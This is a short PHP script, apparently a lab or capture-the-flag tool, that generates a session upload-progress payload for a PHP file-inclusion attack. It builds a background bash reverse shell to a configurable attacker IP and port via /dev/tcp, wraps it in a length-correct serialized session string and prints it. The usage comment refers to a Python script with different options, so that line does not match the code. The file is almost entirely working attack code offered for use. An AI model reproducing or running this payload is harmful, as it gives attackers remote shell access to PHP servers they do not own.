<?php
/**
 * Session Upload Progress Exploit Generator
 * made by Taylor Christian Newsome
 * Usage: python3 rfi_exploit.py -l "http://<target-ip>/index.php?page=" -i "<localhost>" -c "whoami"
 */

// Configuration (can be overridden via CLI arguments: php script.php <IP> <PORT>)
$attacker_ip   = isset($argv[1]) ? $argv[1] : "10.10.14.x";
$attacker_port = isset($argv[2]) ? $argv[2] : "4444";
$session_key   = "testkey";

// 1. Build the reverse shell command using single quotes to avoid escaping issues
$cmd = "nohup bash -c 'bash -i >& /dev/tcp/" . $attacker_ip . "/" . $attacker_port . " 0>&1' >/dev/null 2>&1 &";

// 2. Calculate exact byte-length for PHP serialization precision (s:XX:)
$cmd_length = strlen($cmd);

// 3. Construct the serialized session upload progress template
$session_data = 'upload_progress_' . $session_key . '|a:5:{s:10:"start_time";i:1700000000;s:14:"content_length";i:1000;s:15:"bytes_processed";i:1000;s:4:"done";b:0;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:' . $cmd_length . ':"' . $cmd . '";s:8:"tmp_name";s:0:"";s:5:"error";i:0;s:4:"done";b:1;s:9:"start_time";i:1700000000;s:15:"bytes_processed";i:1000;}}}';

// Output Banner and Results
echo "========================================\n";
echo " Session Upload Progress Payload Gen    \n";
echo " made by Taylor Christian Newsome       \n";
echo "========================================\n\n";
echo "[*] Attacker IP:    {$attacker_ip}\n";
echo "[*] Attacker Port:  {$attacker_port}\n";
echo "[*] Payload Length: {$cmd_length} bytes\n\n";
echo "[+] Generated Session Data String:\n";
echo $session_data . "\n";
?>
